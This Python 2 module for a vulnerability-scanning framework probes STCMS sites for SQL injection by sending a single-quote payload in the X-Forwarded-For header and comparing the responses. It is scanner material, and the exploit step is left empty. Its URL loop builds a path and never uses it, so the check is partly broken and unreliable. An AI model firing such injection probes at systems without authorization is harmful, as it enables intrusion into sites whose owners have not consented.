# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = 'afd05b4b-ce00-4c60-b096-5c9cbf422213'
    name = 'STCMS SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-03-02'  # 漏洞公布时间
    desc = '''
        参数过滤不严，导致注入。
        /music_rl/
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'STCMS'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '70b93688-2d9c-4208-b428-13d8a11133a2'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #__Refer:WooYun-2015-97659
            hh = hackhttp.hackhttp()
            header = [
                "X-Forwarded-For:1",
                "X-Forwarded-For:1'",
            ]
            uris = ('/music_rl/','')
            for uri in uris:
                verify_url = self.target + uri
                code, head, body, errcode, _url = hh.http(self.target, header=header[0])
                code1, head1, body1, errcode1, _url1 = hh.http(self.target, header=header[1])

                if code == 200 and 'login' in body and code1 == 200 and 'login' not in body1:
                    #security_hole("X-Forwarded-For SQLI:"+target)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
